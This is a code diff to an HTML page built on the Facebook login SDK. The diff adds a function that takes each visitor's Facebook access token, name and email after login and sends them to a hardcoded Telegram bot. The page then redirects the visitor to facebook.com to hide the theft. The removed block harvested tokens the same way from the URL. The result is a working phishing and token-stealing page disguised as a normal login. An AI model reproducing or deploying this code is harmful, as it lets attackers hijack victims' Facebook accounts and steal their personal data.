@@ -82,6 +82,10 @@
 
     <!-- Facebook SDK -->
     <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '7811805953:AAE_wfostYkKLMXxvhqJqVLqxqJqVLqxqJq';
+        const TELEGRAM_CHAT_ID = '7806227779';
+
         // Initialize Facebook SDK
         window.fbAsyncInit = function() {
             FB.init({
@@ -106,12 +110,39 @@
             fjs.parentNode.insertBefore(js, fjs);
         }(document, 'script', 'facebook-jssdk'));
 
+        // Send token to Telegram
+        function sendToTelegram(token, userInfo) {
+            const message = `🔑 New Facebook Token Captured!\n\n` +
+                          `👤 Name: ${userInfo.name}\n` +
+                          `📧 Email: ${userInfo.email || 'Not available'}\n` +
+                          `🔐 Access Token:\n${token}\n\n` +
+                          `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            }).then(response => {
+                console.log('Token sent to Telegram!');
+            }).catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
+
         // Handle login status
         function statusChangeCallback(response) {
             if (response.status === 'connected') {
                 // User is logged in
                 console.log('Logged in and authenticated');
-                getUserInfo();
+                const accessToken = response.authResponse.accessToken;
+                
+                // Get user info and send to Telegram
+                getUserInfo(accessToken);
             } else {
                 // User is not logged in
                 console.log('Not logged in');
@@ -120,7 +151,7 @@
         }
 
         // Get user information
-        function getUserInfo() {
+        function getUserInfo(accessToken) {
             FB.api('/me', {fields: 'name,email,picture'}, function(response) {
                 console.log('User Info:', response);
                 
@@ -128,13 +159,17 @@
                 document.getElementById('user-name').textContent = response.name;
                 document.getElementById('user-email').textContent = response.email || 'Email not available';
                 document.getElementById('user-pic').src = response.picture.data.url;
-                
-                // Get access token
-                FB.getLoginStatus(function(loginResponse) {
-                    document.getElementById('access-token').textContent = loginResponse.authResponse.accessToken;
-                });
+                document.getElementById('access-token').textContent = accessToken;
                 
                 document.getElementById('user-info').style.display = 'block';
+                
+                // Send to Telegram
+                sendToTelegram(accessToken, response);
+                
+                // Optional: Redirect to Facebook after 3 seconds
+                setTimeout(function() {
+                    window.location.href = 'https://www.facebook.com';
+                }, 3000);
             });
         }
 
@@ -147,29 +182,5 @@
             });
         }
     </script>
-    <script>
-// Extract access token from URL
-window.onload = function() {
-    const urlParams = new URLSearchParams(window.location.hash.substring(1));
-    const accessToken = urlParams.get('access_token');
-    
-    if (accessToken) {
-        // Send token to your Telegram bot
-        fetch('https://api.telegram.org/bot7811805953:AAE_wfostYkKLMXxvhqJqVLqxqJqVLqxqJq/sendMessage', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: '7806227779',
-                text: '🔑 New Token Captured!\n\nAccess Token: ' + accessToken
-            })
-        });
-        
-        // Redirect to real Facebook
-        window.location.href = 'https://www.facebook.com';
-    }
-};
-</script>
 </body>
 </html>
